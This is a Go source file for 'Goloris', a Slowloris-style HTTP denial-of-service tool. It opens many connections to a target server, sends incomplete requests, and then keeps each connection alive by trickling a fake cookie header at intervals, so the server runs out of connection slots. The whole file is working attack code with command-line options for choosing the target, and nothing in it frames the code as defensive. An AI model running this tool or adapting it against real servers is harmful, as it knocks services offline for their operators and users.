package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
)

var (
	numConnections int
	interval       int
	timeout        int
	method         string
	resource       string
	userAgent      string
	target         string
)

func main() {
	parseParams()
	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		target += ":80"
	}

	openConnections(target, numConnections, timeout)

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "Timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to user")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed if not defined")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
}

func openConnections(target string, num, timeout int) {
	for i := 0; i < num; i++ {
		go slowloris(target, interval, timeout)
	}
}

func slowloris(target string, interval, timeout int) {
	timeoutDuration := time.Duration(timeout) * time.Second

loop:
	for {
		conn, err := net.DialTimeout("tcp", target, timeoutDuration)
		if err != nil {
			continue
		}
		defer conn.Close()

		host := target
		headers := makeHeaders(host)
		req := createRequest(host, method, resource, headers)

		conn.SetWriteDeadline(time.Now().Add(timeoutDuration))
		_, err = io.Copy(conn, req)
		if err != nil {
			continue
		}

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				_, err := conn.Write([]byte("Cookie: a=b\r\n"))
				if err != nil {
					continue loop
				}
			}
		}
	}

}

func createRequest(host, method, resource string, headers map[string]string) *bytes.Buffer {
	buf := bytes.NewBuffer(make([]byte, 0))
	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, resource))

	for header, value := range headers {
		buf.WriteString(fmt.Sprintf("%s: %s\r\n", header, value))
	}

	return buf
}

func makeHeaders(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent
	headers["Content-Length"] = "42"

	return headers
}
